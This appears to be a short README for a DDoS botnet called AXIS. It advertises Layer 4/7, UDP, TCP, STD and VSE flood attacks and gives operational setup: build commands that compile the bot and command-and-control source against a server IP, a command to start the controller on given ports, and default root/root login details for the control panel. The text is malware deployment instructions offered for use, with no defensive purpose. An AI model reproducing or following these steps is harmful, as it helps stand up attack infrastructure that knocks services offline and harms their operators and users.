AXIS Botnet

Use the Axis botnet for ddos attacks. the axis botnet also supports Layer 4/7, UDP, TCP, STD and VSE attacks

Build

						
  # Recommeded to use Centos 7
  root:/# python3 build.py AXIS_CC.c (server-ip)
  root:/# gcc AXIS_CNC.c -o AXIS -pthread

  # Start AXIS
  root:/# screen ./AXIS 606 1 909

Connect (default)

						
  # SSH Config
  Port: 909
  Type: RAW

  # Password
  username: root
  password: root
